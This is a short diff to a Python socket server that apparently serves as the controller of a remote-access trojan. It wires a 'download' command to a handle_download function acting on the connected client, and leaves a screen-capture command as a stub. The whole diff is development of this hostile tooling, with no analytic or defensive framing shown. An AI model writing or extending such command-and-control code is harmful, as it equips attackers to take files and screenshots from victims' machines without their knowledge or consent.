@@ -1,6 +1,7 @@
 import socket, base64
 from termcolor import colored
 from socket_handlers import *
+from server_commands import *
 
 
 def run_server(host, port):
@@ -26,7 +27,9 @@ def run_server(host, port):
             continue
         # * Download Command
         elif command[:8] == "download":
-            pass
+            downloaded_data = handle_download(client_socket, command[9:])
+            if not downloaded_data:
+                continue
         # * Prt Scr Command
         elif command[:7] == "prt_scr":
             pass
